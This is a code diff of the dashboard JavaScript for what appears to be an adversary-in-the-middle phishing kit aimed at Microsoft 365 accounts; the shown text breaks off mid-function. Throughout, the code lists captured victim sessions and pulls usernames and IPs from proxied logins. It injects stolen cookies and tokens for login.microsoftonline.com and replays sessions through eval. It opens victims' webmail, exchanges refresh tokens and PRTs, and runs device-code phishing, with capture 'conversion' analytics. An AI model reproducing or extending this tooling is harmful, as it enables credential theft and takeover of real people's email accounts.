+    let vaultTokens = []; let deviceHistory = []; let deviceInterval;
+    let mapMarkers = [];
 
-        <!-- RECON TAB -->
-        <div class="tab-content" id="tab-recon">
-            <div class="panel">
-                <h3>🔍 Reconnaissance</h3>
-                <input type="text" id="reconToken" placeholder="Paste access token here...">
-                <button class="btn btn-primary" onclick="runRecon()" style="margin-top:8px">🔍 Run Recon</button>
-                <div id="reconResult"></div>
-            </div>
-        </div>
+    function toggleTheme() {
+        document.body.classList.toggle('light-glass');
+        const isLight = document.body.classList.contains('light-glass');
+        localStorage.setItem('theme', isLight ? 'light' : 'dark');
+    }
+    (function restoreTheme() {
+        if (localStorage.getItem('theme') === 'light') document.body.classList.add('light-glass');
+    })();
 
-        <!-- WEBMAIL TAB -->
-        <div class="tab-content" id="tab-webmail">
-            <div class="panel">
-                <h3>📧 Webmail</h3>
-                <input type="text" id="webmailToken" placeholder="Paste access token here...">
-                <div class="flex-row" style="margin-top:8px">
-                    <button class="btn btn-primary" onclick="loadFolders()">📁 Load Folders</button>
-                    <button class="btn" onclick="loadEmails('inbox')">📥 Inbox</button>
-                    <button class="btn" onclick="loadEmails('sent')">📤 Sent</button>
-                </div>
-                <div id="webmailFolders"></div>
-                <div id="webmailEmails"></div>
-            </div>
-        </div>
-    </main>
+    function switchTab(tabId) {
+        document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+        document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
+        document.getElementById('tab-' + tabId).classList.add('active');
+        document.querySelector(`.tab[data-tab="${tabId}"]`).classList.add('active');
+        if (tabId === 'vault') loadVault();
+        if (tabId === 'prt') loadPRTs();
+        if (tabId === 'analytics') loadAnalytics();
+        if (tabId === 'device') { refreshDeviceHistory(); if (deviceInterval) clearInterval(deviceInterval); deviceInterval = setInterval(refreshDeviceHistory, 10000); }
+        else { if (deviceInterval) clearInterval(deviceInterval); }
+    }
 
-    <div class="toast" id="toast"></div>
+    function connectWebSocket() {
+        const wsProtocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
+        ws = new WebSocket(wsProtocol + location.host);
+        const wsDot = document.getElementById('wsDot'), wsLabel = document.getElementById('wsLabel');
+        ws.onopen = () => { wsDot.className = 'ws-dot online'; wsLabel.textContent = 'Live'; reconnectAttempts = 0; };
+        ws.onclose = () => { wsDot.className = 'ws-dot offline'; wsLabel.textContent = 'Disconnected'; if (reconnectAttempts < maxReconnectAttempts) { reconnectAttempts++; setTimeout(connectWebSocket, Math.min(5000 + reconnectAttempts * 1000, 30000)); } };
+        ws.onmessage = (event) => { try { const data = JSON.parse(event.data); if (data.type === 'newLog') { showToast('📥 New capture: ' + data.file); refreshLogs(); } } catch (e) {} };
+    }
 
-    <script>
-        // ============================================================
-        // 🔧 API HELPER
-        // ============================================================
-        const API_BASE = '/dash/api';
-        
-        async function api(path, options = {}) {
-            const url = API_BASE + path;
-            const config = {
-                headers: { 'Content-Type': 'application/json' },
-                ...options
-            };
-            if (options.body && typeof options.body === 'object') {
-                config.body = JSON.stringify(options.body);
-            }
-            const res = await fetch(url, config);
-            if (!res.ok) {
-                const err = await res.json().catch(() => ({ error: res.statusText }));
-                throw new Error(err.error || 'Request failed');
-            }
-            return res.json();
-        }
+    function showToast(msg, isError = false) {
+        const container = document.getElementById('toastContainer');
+        const toast = document.createElement('div');
+        toast.className = 'toast' + (isError ? ' error' : '');
+        toast.textContent = msg; container.appendChild(toast);
+        setTimeout(() => toast.remove(), 4000);
+    }
 
-        function showToast(msg, isError = false) {
-            const t = document.getElementById('toast');
-            t.textContent = msg;
-            t.className = 'toast ' + (isError ? 'error' : '') + ' show';
-            setTimeout(() => t.classList.remove('show'), 3000);
-        }
+    function getFlagEmoji(countryCode) {
+        if (!countryCode || countryCode.length !== 2) return '🌍';
+        return String.fromCodePoint(0x1F1E6 + countryCode.charCodeAt(0) - 65, 0x1F1E6 + countryCode.charCodeAt(1) - 65);
+    }
 
-        // ============================================================
-        // 🎨 THEME + NAVIGATION
-        // ============================================================
-        function toggleTheme() {
-            const html = document.documentElement;
-            const current = html.getAttribute('data-theme');
-            html.setAttribute('data-theme', current === 'dark' ? 'light' : 'dark');
-            localStorage.setItem('phantom-theme', current === 'dark' ? 'light' : 'dark');
-        }
-        (function() {
-            const saved = localStorage.getItem('phantom-theme');
-            if (saved) document.documentElement.setAttribute('data-theme', saved);
-        })();
+    async function getIPLocation(ip) {
+        try { const res = await fetch(`https://ipapi.co/${ip}/json/`); const data = await res.json(); if (data.latitude && data.longitude) return { lat: data.latitude, lon: data.longitude, country: data.country_name, city: data.city }; } catch (e) {}
+        return null;
+    }
 
-        document.querySelectorAll('.sidebar nav a').forEach(link => {
-            link.addEventListener('click', (e) => {
-                e.preventDefault();
-                const tab = link.getAttribute('data-tab');
-                switchTab(tab);
-            });
+    function injectTokenAsCookie(token, domain = '.login.microsoftonline.com') {
+        if (!token) { showToast('❌ No token to inject', true); return; }
+        try { document.cookie = `access_token=${token}; path=/; domain=${domain}; Secure; SameSite=None`; document.cookie = `jwt=${token}; path=/; domain=${domain}; Secure; SameSite=None`; localStorage.setItem('evil_token', token); showToast(`✅ Token injected for ${domain}`); if (confirm(`Redirect to ${domain}?`)) window.location.href = `https://${domain}`; } catch (e) { showToast('❌ Cookie injection failed: ' + e.message, true); }
+    }
+
+    function openWebmail(token, username = 'User') {
+        if (!token) { showToast('❌ No token available', true); return; }
+        localStorage.setItem('evil_token_direct', token); localStorage.setItem('evil_token_user', username);
+        window.open('/webmail', '_blank'); showToast(`📧 Opening webmail for ${username}...`);
+    }
+
+    // =============================================
+    // DASHBOARD
+    // =============================================
+    async function refreshLogs() {
+        try {
+            const res = await fetch('/dash/api/logs'); const logs = await res.json();
+            allLogs = logs; renderTable(logs); updateStats(logs); updateChart(logs);
+            await fetchVisits(); await updateMapWithVisits();
+        } catch (e) { showToast('Failed to fetch logs: ' + e.message, true); }
+    }
+
+    function renderTable(logs) {
+        const tbody = document.getElementById('logTable');
+        const search = document.getElementById('searchInput').value.toLowerCase();
+        const filter = document.getElementById('filterDate').value;
+        const now = new Date();
+        let filtered = logs;
+        if (search) filtered = filtered.filter(log => log.name.toLowerCase().includes(search));
+        if (filter === 'today') filtered = filtered.filter(log => new Date(log.modified).toDateString() === now.toDateString());
+        else if (filter === 'week') filtered = filtered.filter(log => new Date(log.modified) >= new Date(now.getTime() - 7*24*60*60*1000));
+        tbody.innerHTML = '';
+        filtered.forEach(log => {
+            const row = document.createElement('tr');
+            row.innerHTML = `<td><span class="badge">${log.name}</span></td><td>${(log.size/1024).toFixed(1)} KB</td><td>${new Date(log.modified).toLocaleString()}</td><td id="user-${log.name}">Loading...</td><td id="ip-${log.name}">Loading...</td><td><button class="action-btn" onclick="viewLog('${log.name}')">🔍 View</button><button class="action-btn cookie" onclick="injectCookies('${log.name}')">🍪 Inject</button><button class="action-btn" onclick="replaySession('${log.name}')">▶ Replay</button><button class="action-btn" onclick="showTokens('${log.name}')">🔑 Tokens</button><button class="action-btn" onclick="openWebmailFromLog('${log.name}')">📧 Webmail</button></td>`;
+            tbody.appendChild(row); fetchMetadata(log.name);
         });
+    }
 
-        function switchTab(tab) {
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-            document.querySelectorAll('.sidebar nav a').forEach(l => l.classList.remove('active'));
-            const target = document.getElementById('tab-' + tab);
-            if (target) target.classList.add('active');
-            const navLink = document.querySelector(`[data-tab="${tab}"]`);
-            if (navLink) navLink.classList.add('active');
-            document.getElementById('pageTitle').textContent = 
-                tab === 'dashboard' ? '📊 Dashboard' :
-                tab === 'sessions' ? '📋 Sessions' :
-                tab === 'vault' ? '🏛️ Token Vault' :
-                tab === 'analytics' ? '📈 Analytics' :
-                tab === 'device' ? '📱 Device Code' :
-                tab === 'prt' ? '🔐 PRT Engine' :
-                tab === 'recon' ? '🔍 Recon' :
-                tab === 'webmail' ? '📧 Webmail' : '📊 Dashboard';
-            if (tab === 'sessions') loadAllSessions();
-            if (tab === 'device') loadDeviceHistory();
-            if (tab === 'prt') loadPRTList();
-            if (tab === 'analytics') loadAnalytics();
-            if (tab === 'vault') loadVaultStats();
-        }
+    async function openWebmailFromLog(filename) {
+        try { const res = await fetch(`/dash/api/tokens/${filename}`); const data = await res.json(); if (data.tokens?.access_tokens?.length > 0) openWebmail(data.tokens.access_tokens[0], data.tokens.username || 'User'); else showToast('❌ No access token found', true); } catch (e) { showToast('❌ Failed: ' + e.message, true); }
+    }
 
-        // ============================================================
-        // 📊 DASHBOARD
-        // ============================================================
-        async function refreshAll() {
-            try {
-                const [status, visits] = await Promise.all([
-                    api('/status').catch(() => ({ online: false, totalSessions: 0 })),
-                    api('/visits').catch(() => ({ total: 0, uniqueIPs: 0, today: 0 }))
-                ]);
-                document.getElementById('statSessions').textContent = status.totalSessions || 0;
-                document.getElementById('statStatus').innerHTML = status.online ? '✅ Online' : '❌ Offline';
-                document.getElementById('statStatus').className = 'value ' + (status.online ? 'green' : 'red');
-                document.getElementById('statVisits').textContent = visits.total || 0;
-                document.getElementById('statUniqueIPs').textContent = visits.uniqueIPs || 0;
-                document.getElementById('statToday').textContent = visits.today || 0;
-                showToast('Dashboard refreshed');
-            } catch (e) {
-                showToast('Refresh failed: ' + e.message, true);
-            }
-        }
-
-        async function exportZip() {
-            try {
-                const res = await fetch(API_BASE + '/export/all');
-                if (!res.ok) throw new Error('Export failed');
-                const blob = await res.blob();
-                const url = window.URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = 'phantom_export_' + Date.now() + '.zip';
-                a.click();
-                showToast('Export downloaded');
-            } catch (e) {
-                showToast('Export failed: ' + e.message, true);
-            }
-        }
-
-        async function testTelegram() {
-            try {
-                const res = await api('/test-telegram');
-                showToast('Telegram test: ' + (res.success ? '✅ Sent' : '❌ Failed'));
-            } catch (e) {
-                showToast('Telegram test failed: ' + e.message, true);
-            }
-        }
-
-        async function loadRecentSessions() {
-            try {
-                const logs = await api('/logs');
-                const container = document.getElementById('recentSessions');
-                if (!logs || logs.length === 0) {
-                    container.innerHTML = '<p style="color:var(--muted)">No sessions yet.</p>';
-                    return;
+    async function fetchMetadata(filename) {
+        try {
+            const res = await fetch(`/dash/api/log/${filename}`); const data = await res.json();
+            if (data.entries?.length > 0) {
+                let username = 'N/A', ip = 'N/A';
+                for (const entry of data.entries) {
+                    const body = entry.proxyRequestBody;
+                    if (body) {
+                        try { const parsed = typeof body === 'string' ? JSON.parse(body) : body; username = parsed.username || parsed.login || parsed.user || parsed.Email || parsed.upn || parsed.loginfmt || 'N/A'; if (username !== 'N/A') break; } catch (e) { const match = body.match(/(?:username|login|user|Email|loginfmt|upn)=([^&]+)/i); if (match) { username = decodeURIComponent(match[1]); break; } }
+                    }
+                    ip = entry.proxyRequestHeaders?.['cf-connecting-ip'] || entry.proxyRequestHeaders?.['x-real-ip'] || entry.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 'N/A';
+                    if (ip !== 'N/A') break;
                 }
-                container.innerHTML = logs.slice(0, 10).map(l => 
-                    `<div style="padding:8px 0;border-bottom:1px solid var(--border);font-size:13px">
-                        📄 ${l.name} — ${new Date(l.modified).toLocaleString()} — ${(l.size/1024).toFixed(1)} KB
-                        <button class="btn btn-sm" style="margin-left:10px" onclick="viewSession('${l.name}')">View</button>
-                    </div>`
-                ).join('');
-            } catch (e) { document.getElementById('recentSessions').innerHTML = '<p style="color:var(--red)">Failed to load.</p>'; }
-        }
-
-        async function loadAllSessions() {
-            try {
-                const logs = await api('/logs');
-                const container = document.getElementById('allSessions');
-                if (!logs || logs.length === 0) {
-                    container.innerHTML = '<p style="color:var(--muted)">No sessions yet.</p>';
-                    return;
-                }
-                container.innerHTML = `<table><thead><tr><th>File</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead><tbody>` +
-                    logs.map(l => `<tr>
-                        <td>📄 ${l.name}</td>
-                        <td>${(l.size/1024).toFixed(1)} KB</td>
-                        <td>${new Date(l.modified).toLocaleString()}</td>
-                        <td>
-                            <button class="btn btn-sm" onclick="viewSession('${l.name}')">View</button>
-                            <button class="btn btn-sm" onclick="viewTokens('${l.name}')">Tokens</button>
-                            <button class="btn btn-sm" onclick="replaySession('${l.name}')">Replay</button>
-                        </td>
-                    </tr>`).join('') + '</tbody></table>';
-            } catch (e) { document.getElementById('allSessions').innerHTML = '<p style="color:var(--red)">Failed to load.</p>'; }
-        }
-
-        async function viewSession(filename) {
-            try {
-                const data = await api('/log/' + filename);
-                const container = document.getElementById('allSessions');
-                container.innerHTML = '<h4>📄 ' + filename + '</h4><textarea readonly>' + 
-                    JSON.stringify(data.entries, null, 2) + '</textarea>' +
-                    '<button class="btn" style="margin-top:8px" onclick="loadAllSessions()">← Back</button>';
-            } catch (e) { showToast('Failed to load session', true); }
-        }
-
-        async function viewTokens(filename) {
-            try {
-                const data = await api('/tokens/' + filename);
-                const container = document.getElementById('allSessions');
-                container.innerHTML = '<h4>🔑 Tokens from ' + filename + '</h4><textarea readonly>' + 
-                    JSON.stringify(data.tokens, null, 2) + '</textarea>' +
-                    '<button class="btn" style="margin-top:8px" onclick="loadAllSessions()">← Back</button>';
-            } catch (e) { showToast('Failed to load tokens', true); }
-        }
-
-        async function replaySession(filename) {
-            try {
-                const data = await api('/replay/' + filename);
-                const container = document.getElementById('allSessions');
-                container.innerHTML = '<h4>🎬 Replay: ' + filename + '</h4>' +
-                    '<p>Cookies: ' + data.cookieCount + ' | Domain: ' + data.targetDomain + '</p>' +
-                    '<textarea readonly style="height:200px">' + data.replayScript + '</textarea>' +
-                    '<button class="btn" style="margin-top:8px" onclick="loadAllSessions()">← Back</button>';
-            } catch (e) { showToast('Failed to load replay', true); }
-        }
-
-        // ============================================================
-        // 🏛️ TOKEN VAULT
-        // ============================================================
-        async function scanVault() {
-            try {
-                const res = await api('/vault/scan', { method: 'POST' });
-                showToast('Scanned: ' + res.count + ' tokens found');
-                await loadVaultStats();
-                await loadVaultTokens();
-            } catch (e) { showToast('Scan failed: ' + e.message, true); }
-        }
-
-        async function loadVaultStats() {
-            try {
-                const stats = await api('/vault/stats');
-                document.getElementById('vaultStats').innerHTML = `
-                    <div class="flex-row">
-                        <div class="stat-card"><div class="label">Total</div><div class="value accent">${stats.stats.total}</div></div>
-                        <div class="stat-card"><div class="label">Access</div><div class="value">${stats.stats.access}</div></div>
-                        <div class="stat-card"><div class="label">Refresh</div><div class="value orange">${stats.stats.refresh}</div></div>
-                        <div class="stat-card"><div class="label">PRT</div><div class="value green">${stats.stats.prt}</div></div>
-                    </div>`;
-            } catch (e) {}
-        }
-
-        async function loadVaultTokens() {
-            try {
-                const data = await api('/vault/tokens');
-                const tokens = data.tokens || [];
-                document.getElementById('vaultTokens').innerHTML = tokens.length === 0 ? 
-                    '<p style="color:var(--muted)">No tokens found. Click "Scan Logs".</p>' :
-                    `<table><thead><tr><th>Type</th><th>Username</th><th>Token</th></tr></thead><tbody>` +
-                    tokens.map(t => `<tr><td>🔑 ${t.type}</td><td>${t.username}</td><td style="font-family:monospace;font-size:11px">${t.value.slice(0,40)}...</td></tr>`).join('') +
-                    '</tbody></table>';
-            } catch (e) {}
-        }
-
-        async function healthCheckVault() {
-            try {
-                const res = await api('/vault/healthcheck', { method: 'POST' });
-                document.getElementById('vaultTokens').innerHTML = '<h4>💚 Health Check Results</h4>' +
-                    res.results.map(r => `<div style="padding:6px 0;border-bottom:1px solid var(--border)">${r.status === 'valid' ? '✅' : '❌'} ${r.username}: ${r.status} ${r.user || ''}</div>`).join('');
-            } catch (e) { showToast('Health check failed', true); }
-        }
-
-        // ============================================================
-        // 📈 ANALYTICS
-        // ============================================================
-        async function loadAnalytics() {
-            try {
-                const data = await api('/analytics');
-                const a = data.analytics;
-                document.getElementById('analyticsData').innerHTML = `
-                    <div class="stats-grid" style="margin-bottom:15px">
-                        <div class="stat-card"><div class="label">Total Visits</div><div class="value">${a.visits.total}</div><div class="sub">Today: ${a.visits.today}</div></div>
-                        <div class="stat-card"><div class="label">Total Captures</div><div class="value accent">${a.captures.total}</div><div class="sub">Today: ${a.captures.today}</div></div>
-                        <div class="stat-card"><div class="label">Conversion</div><div class="value orange">${a.conversionRate.total}%</div><div class="sub">Today: ${a.conversionRate.today}%</div></div>
-                        <div class="stat-card"><div class="label">Unique IPs</div><div class="value green">${a.uniqueIPs}</div></div>
-                    </div>
-                    <h4>🌐 Top Domains</h4>
-                    ${(a.topDomains || []).map(d => `<div style="padding:4px 0">🔗 ${d.domain}: ${d.count} visits</div>`).join('') || '<p style="color:var(--muted)">No data</p>'}
-                `;
-            } catch (e) { document.getElementById('analyticsData').innerHTML = '<p style="color:var(--red)">Failed to load.</p>'; }
-        }
-
-        // ============================================================
-        // 📱 DEVICE CODE
-        // ============================================================
-        async function requestDeviceCode() {
-            try {
-                const res = await api('/device/request', { method: 'POST' });
-                document.getElementById('deviceResult').innerHTML = `
-                    <div class="panel" style="border:2px solid var(--accent)">
-                        <h4>🔑 Device Code Generated!</h4>
-                        <p><strong>User Code:</strong> <span style="font-size:24px;font-weight:800;color:var(--accent)">${res.user_code}</span></p>
-                        <p><strong>Verification URL:</strong> ${res.verification_uri}</p>
-                        <p>Expires in: ${res.expires_in} seconds | Interval: ${res.interval}s</p>
-                        <button class="btn btn-primary" onclick="pollDeviceToken('${res.device_code}')">🔄 Poll for Token</button>
-                    </div>`;
-            } catch (e) { showToast('Device code request failed: ' + e.message, true); }
-        }
-
-        async function pollDeviceToken(deviceCode) {
-            try {
-                const res = await api('/device/token', { method: 'POST', body: { device_code: deviceCode } });
-                document.getElementById('deviceResult').innerHTML += `
-                    <div class="panel" style="border:2px solid var(--green)">
-                        <h4>✅ Token Received!</h4>
-                        <textarea readonly>${JSON.stringify(res, null, 2)}</textarea>
-                    </div>`;
-                showToast('Token received!');
-            } catch (e) {
-                if (e.message.includes('authorization_pending')) {
-                    showToast('Still waiting for user approval...');
-                    setTimeout(() => pollDeviceToken(deviceCode), 5000);
-                } else {
-                    showToast('Token poll failed: ' + e.message, true);
-                }
+                const userCell = document.getElementById(`user-${filename}`); if (userCell) userCell.textContent = username;
+                const ipCell = document.getElementById(`ip-${filename}`); if (ipCell) ipCell.textContent = ip;
             }
-        }
+        } catch (e) {}
+    }
 
-        async function loadDeviceHistory() {
-            try {
-                const res = await api('/device/history');
-                const flows = res.flows || [];
-                document.getElementById('deviceHistory').innerHTML = flows.length === 0 ?
-                    '<p style="color:var(--muted)">No device flows yet.</p>' :
-                    `<table><thead><tr><th>User Code</th><th>Status</th><th>Created</th><th>Actions</th></tr></thead><tbody>` +
-                    flows.map(f => `<tr>
-                        <td><code>${f.user_code}</code></td>
-                        <td><span class="badge ${f.status === 'approved' ? 'enabled' : 'disabled'}">${f.status}</span></td>
-                        <td>${new Date(f.created).toLocaleString()}</td>
-                        <td>${f.access_token ? `<button class="btn btn-sm" onclick="useDeviceToken('${f.session_id}')">Use</button>` : '—'}</td>
-                    </tr>`).join('') + '</tbody></table>';
-            } catch (e) { document.getElementById('deviceHistory').innerHTML = '<p style="color:var(--red)">Failed to load.</p>'; }
-        }
+    function updateStats(logs) {
+        document.getElementById('total').textContent = logs.length;
+        document.getElementById('last').textContent = logs.length > 0 ? new Date(logs[0].modified).toLocaleString() : 'No captures';
+    }
 
-        async function useDeviceToken(sessionId) {
-            try {
-                const res = await api('/device/use', { method: 'POST', body: { session_id: sessionId } });
-                document.getElementById('deviceResult').innerHTML = `
-                    <div class="panel" style="border:2px solid var(--green)">
-                        <h4>🔑 Token for Session ${sessionId}</h4>
-                        <textarea readonly>${JSON.stringify(res, null, 2)}</textarea>
-                    </div>`;
-            } catch (e) { showToast('Failed to get token', true); }
-        }
+    function updateChart(logs) {
+        const ctx = document.getElementById('captureChart').getContext('2d');
+        const now = new Date(); const days = {};
+        for (let i = 6; i >= 0; i--) days[new Date(now.getTime() - i*24*60*60*1000).toDateString()] = 0;
+        logs.forEach(log => { const d = new Date(log.modified).toDateString(); if (days.hasOwnProperty(d)) days[d]++; });
+        if (chart) chart.destroy();
+        chart = new Chart(ctx, { type: 'bar', data: { labels: Object.keys(days), datasets: [{ label: 'Captures', data: Object.values(days), backgroundColor: 'rgba(130, 177, 255, 0.4)', borderColor: '#82b1ff', borderWidth: 2, borderRadius: 8 }] }, options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { labels: { color: '#a0b0c0' } } }, scales: { y: { beginAtZero: true, ticks: { color: '#a0b0c0' }, grid: { color: 'rgba(255,255,255,0.05)' } }, x: { ticks: { color: '#a0b0c0' }, grid: { display: false } } } } });
+    }
 
-        // ============================================================
-        // 🔐 PRT ENGINE
-        // ============================================================
-        async function scanPRTs() {
-            try {
-                const res = await api('/prt/scan', { method: 'POST' });
-                showToast('Found ' + res.count + ' PRTs');
-                loadPRTList();
-                loadPRTStats();
-            } catch (e) { showToast('PRT scan failed', true); }
-        }
+    async function updateMapWithVisits() {
+        try {
+            const res = await fetch('/dash/api/visits'); const data = await res.json();
+            if (!data.visits?.length) { if (!map) { map = L.map('map').setView([20, 0], 2); L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { attribution: '&copy; OpenStreetMap, &copy; CartoDB' }).addTo(map); } return; }
+            const uniqueIPs = [...new Set(data.visits.map(v => v.ip).filter(ip => ip !== 'Unknown'))];
+            const locations = []; for (const ip of uniqueIPs.slice(0, 20)) { const loc = await getIPLocation(ip); if (loc) locations.push({ ip, ...loc }); }
+            if (!map) { map = L.map('map').setView([20, 0], 2); L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { attribution: '&copy; OpenStreetMap, &copy; CartoDB' }).addTo(map); }
+            mapMarkers.forEach(m => map.removeLayer(m)); mapMarkers = [];
+            locations.forEach(loc => { if (loc.lat && loc.lon) { const marker = L.circleMarker([loc.lat, loc.lon], { radius: 8, fillColor: '#82b1ff', color: '#536dfe', weight: 2, opacity: 0.8, fillOpacity: 0.6 }).addTo(map); marker.bindPopup(`<b>IP:</b> ${loc.ip}<br><b>Location:</b> ${loc.city}, ${loc.country}`); mapMarkers.push(marker); } });
+            if (locations.length > 0) { const bounds = L.latLngBounds(locations.filter(l => l.lat && l.lon).map(l => [l.lat, l.lon])); if (bounds.isValid()) map.fitBounds(bounds, { padding: [50, 50] }); }
+        } catch (e) { console.error('Map error:', e); }
+    }
 
-        async function loadPRTList() {
-            try {
-                const res = await api('/prt/list');
-                const prts = res.prts || [];
-                document.getElementById('prtList').innerHTML = prts.length === 0 ?
-                    '<p style="color:var(--muted)">No PRTs found. Click "Scan PRTs".</p>' :
-                    `<table><thead><tr><th>Username</th><th>PRT</th><th>Source</th><th>Actions</th></tr></thead><tbody>` +
-                    prts.map(p => `<tr>
-                        <td>${p.username}</td>
-                        <td style="font-family:monospace;font-size:11px">${p.prt.slice(0,40)}...</td>
-                        <td>${p.source}</td>
-                        <td>
-                            <button class="btn btn-sm" onclick="exchangePRT('${p.prt}')">Exchange</button>
-                            <button class="btn btn-sm" onclick="healthPRT('${p.prt}')">Health</button>
-                        </td>
-                    </tr>`).join('') + '</tbody></table>';
-            } catch (e) {}
-        }
+    async function fetchVisits() {
+        try { const res = await fetch('/dash/api/visits'); const data = await res.json(); document.getElementById('totalVisits').textContent = data.total || 0; document.getElementById('uniqueIPs').textContent = data.uniqueIPs || 0; document.getElementById('todayVisits').textContent = data.today || 0; } catch (e) {}
+    }
 
-        async function loadPRTStats() {
-            try {
-                const res = await api('/prt/stats');
-                document.getElementById('prtStats').innerHTML = `
-                    <div class="flex-row">
-                        <div class="stat-card"><div class="label">Total PRTs</div><div class="value accent">${res.stats.total}</div></div>
-                        <div class="stat-card"><div class="label">Unique Users</div><div class="value">${res.stats.uniqueUsers}</div></div>
-                        <div class="stat-card"><div class="label">Last Scan</div><div class="value" style="font-size:14px">${res.stats.lastScan ? new Date(res.stats.lastScan).toLocaleString() : 'Never'}</div></div>
-                    </div>`;
-            } catch (e) {}
-        }
+    function filterTable() { renderTable(allLogs); }
 
-        async function exchangePRT(prt) {
-            try {
-                const res = await api('/prt/exchange', { method: 'POST', body: { prt } });
-                document.getElementById('prtList').innerHTML += `
-                    <div class="panel" style="border:2px solid var(--green);margin-top:10px">
-                        <h4>✅ PRT Exchanged!</h4>
-                        <textarea readonly>${JSON.stringify(res.data, null, 2)}</textarea>
-                    </div>`;
-                showToast('PRT exchanged!');
-            } catch (e) { showToast('Exchange failed: ' + e.message, true); }
-        }
+    // =============================================
+    // VIEW / INJECT / REPLAY / TOKENS
+    // =============================================
+    async function viewLog(filename) {
+        document.getElementById('modal').style.display = 'flex'; document.getElementById('modalTitle').textContent = `📄 ${filename}`; document.getElementById('modalBody').innerHTML = '<p>Loading...</p>';
+        try { const res = await fetch(`/dash/api/log/${filename}`); const data = await res.json(); if (data.error) { document.getElementById('modalBody').innerHTML = `<p style="color:#ff6b6b;">${data.error}</p>`; return; } let html = ''; data.entries.forEach((entry, idx) => { html += `<h4 style="margin:12px 0 6px;">Entry ${idx+1}</h4><pre>${JSON.stringify(entry, null, 2)}</pre><hr style="border-color:rgba(255,255,255,0.05);">`; }); document.getElementById('modalBody').innerHTML = html; } catch (e) { document.getElementById('modalBody').innerHTML = `<p style="color:#ff6b6b;">Failed: ${e.message}</p>`; }
+    }
 
-        async function healthPRT(prt) {
-            try {
-                const res = await api('/prt/health', { method: 'POST', body: { prt } });
-                showToast('PRT Health: ' + (res.valid ? '✅ Valid' : '❌ Invalid'));
-            } catch (e) { showToast('Health check failed', true); }
-        }
+    async function injectCookies(filename) {
+        try { const res = await fetch(`/dash/api/log/${filename}`); const data = await res.json(); if (!data.entries?.length) { showToast('No entries.', true); return; } const allCookies = []; data.entries.forEach(entry => { if (entry.proxyResponseHeaders?.['set-cookie']) { let c = entry.proxyResponseHeaders['set-cookie']; if (!Array.isArray(c)) c = [c]; c.forEach(cookie => { const [nv] = cookie.split(';'); if (nv) allCookies.push(nv); }); } }); if (allCookies.length === 0) { showToast('No cookies found.', true); return; } allCookies.forEach(c => { try { document.cookie = c + '; path=/; domain=' + window.location.hostname + '; Secure'; } catch (e) {} }); await navigator.clipboard.writeText(allCookies.join('; ')); showToast(`🍪 ${allCookies.length} cookies injected + copied!`); if (confirm(`${allCookies.length} cookies injected. Redirect?`)) { const d = prompt('Target domain:', 'login.microsoftonline.com'); if (d) window.location.href = 'https://' + d; } } catch (e) { showToast('Error: ' + e.message, true); }
+    }
 
-        async function healthAllPRTs() {
-            try {
-                const res = await api('/prt/health-all', { method: 'POST' });
-                document.getElementById('prtList').innerHTML = '<h4>💚 Health All Results</h4>' +
-                    res.results.map(r => `<div style="padding:6px 0;border-bottom:1px solid var(--border)">${r.valid ? '✅' : '❌'} ${r.username}: ${r.valid ? 'Valid' : r.error}</div>`).join('');
-            } catch (e) { showToast('Health all failed', true); }
-        }
+    async function replaySession(filename) {
+        try { const res = await fetch(`/dash/api/replay/${filename}`); const data = await res.json(); if (data.error) { showToast('❌ ' + data.error, true); return; } eval(data.replayScript); showToast(`✅ ${data.cookieCount} cookies injected. Redirecting...`); } catch (e) { showToast('❌ Error: ' + e.message, true); }
+    }
 
-        async function exchangeAllPRTs() {
-            try {
-                const res = await api('/prt/exchange-all', { method: 'POST' });
-                document.getElementById('prtList').innerHTML = '<h4>🔄 Exchange All Results</h4>' +
-                    res.results.map(r => `<div style="padding:6px 0;border-bottom:1px solid var(--border)">${r.success ? '✅' : '❌'} ${r.username}: ${r.success ? 'Exchanged' : r.error}</div>`).join('');
-            } catch (e) { showToast('Exchange all failed', true); }
-        }
+    async function showTokens(filename) {
+        try { const res = await fetch(`/dash/api/tokens/${filename}`); const data = await res.json(); if (data.error) { showToast('❌ ' + data.error, true); return; } const t = data.tokens || {}; let msg = `🔑 Access: ${t.access_tokens?.length||0}\n🔄 Refresh: ${t.refresh_tokens?.length||0}\n🆔 ID: ${t.id_tokens?.length||0}\n🔐 PRT: ${t.prt_tokens?.length||0}`; if (t.prt_tokens?.length > 0 && confirm(msg + '\n\nExchange PRT?')) { await exchangePRT(t.prt_tokens[0]); return; } if (t.refresh_tokens?.length > 0 && confirm(msg + '\n\nExchange refresh token?')) { await exchangeRefreshToken(t.refresh_tokens[0]); return; } alert(msg); } catch (e) { showToast('❌ Error: ' + e.message, true); }
+    }
 
-        // ============================================================
-        // 🔍 RECON
-        // ============================================================
-        async function runRecon() {
-            const token = document.getElementById('reconToken').value.trim();
-            if (!token) { showToast('Paste an access token first', true); return; }
-            try {
-                const res = await api('/recon', { method: 'POST', body: { accessToken: token } });
-                document.getElementById('reconResult').innerHTML = `
-                    <div class="panel" style="border:2px solid var(--green);margin-top:10px">
-                        <h4>🔍 Recon Results</h4>
-                        <textarea readonly style="height:300px">${JSON.stringify(res.profile, null, 2)}</textarea>
-                    </div>`;
-            } catch (e) { showToast('Recon failed: ' + e.message, true); }
-        }
+    async function exchangeRefreshToken(rt) { try { const res = await fetch('/dash/api/vault/exchange', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ tokenValue: rt }) }); const data = await res.json(); if (data.success && data.data?.access_token) { showToast('✅ New access token!'); localStorage.setItem('evil_token', JSON.stringify(data.data)); window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.data.access_token}`, '_blank'); } else showToast('❌ Exchange failed', true); } catch (e) { showToast('❌ Error: ' + e.message, true); } }
 
-        // ============================================================
-        // 📧 WEBMAIL
-        // ============================================================
-        async function loadFolders() {
-            const token = document.getElementById('webmailToken').value.trim();
-            if (!token) { showToast('Paste an access token first', true); return; }
-            try {
